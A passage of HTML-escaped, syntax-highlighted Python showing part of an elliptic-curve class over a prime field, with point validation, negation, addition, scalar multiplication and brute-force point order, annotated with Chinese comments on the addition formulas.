        &lt;span class=&quot;c1&quot;&gt;# just as unique ZERO value representation for &amp;#34;add&amp;#34;: (not on curve)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Coord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# Judge if the coordinate in the curve&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# find points on curve at x&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - x: int &amp;lt; p&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# - returns: ((x, y), (x,-y)) or not found exception&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ysq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ysq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Coord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Coord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;neg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# negate p&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Coord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# 1.无穷远点 O∞是零元，有O∞+ O∞= O∞，O∞+P=P&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 2.P(x,y)的负元是 (x,-y mod p)= (x,p-y) ，有P+(-P)= O∞&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 3.P(x1,y1),Q(x2,y2)的和R(x3,y3) 有如下关系：&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# x3≡k**2-x1-x2(mod p)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# y3≡k(x1-x3)-y1(mod p)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 若P=Q 则 k=(3x2+a)/2y1mod p&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 若P≠Q，则k=(y2-y1)/(x2-x1) mod p&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# of elliptic curve: negate of 3rd cross point of (p1,p2) line&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# p1 + -p1 == 0&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# p1 + p1: use tangent line of p1 as (p1,p1) line&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Coord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# n times of elliptic curve&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;m2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# O(log2(n)) add&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;order&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# order of point g&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mul&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
